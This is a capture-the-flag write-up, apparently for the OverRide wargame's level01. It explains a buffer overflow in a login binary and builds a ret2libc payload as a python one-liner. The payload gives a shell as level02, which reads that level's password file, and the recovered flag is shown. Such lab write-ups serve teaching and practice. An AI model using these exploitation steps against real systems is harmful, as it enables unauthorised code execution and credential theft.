level01
=======

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

*	We spawn with a [level01](src/level01) executable.
*	Here is the [code](src/level01.c):
* The program asks for a username and a password:
  - The username must be `dat_wil`.
  - The password buffer is 64 bytes, but `fgets()` reads up to 100 bytes, allowing a buffer overflow.
  - The program always rejects the password, so we need to exploit the overflow.
* Using a cyclic pattern in GDB, we overwrite EIP and find an offset of `80 bytes`:
	```gdb
	(gdb) run
	Starting program: /home/users/level01/level01 
	********* ADMIN LOGIN PROMPT *********
	Enter Username: dat_wil
	verifying username....

	Enter Password: 
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
	nope, incorrect password...


	Program received signal SIGSEGV, Segmentation fault.
	0x37634136 in ?? ()
	(gdb) 
	```
* We can use ret2libc to execute `system("/bin/sh")`. Let's retrieve the addresses:
  ```gdb
  (gdb) p system
  $1 = 0xf7e6aed0 <system>
  (gdb) p exit
  $2 = 0xf7e5eb70 <exit>
  (gdb) find &system,+9999999,"/bin/sh"
  0xf7f897ec
  ```
* Our payload consists of 80 bytes of padding, followed by `system`, `exit` (return address) and `/bin/sh` (argument).
*	Let's finish this exerice :
	```console
	level01@OverRide:~$ python -c 'print "dat_wil\n" + "a"*80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec" [::-1]' > /tmp/level01
	level01@OverRide:~$ cat /tmp/level01 - | ./level01 
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password: 
	nope, incorrect password...

	whoami
	level02
	cat /home/users/level02/.pass
	PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
	```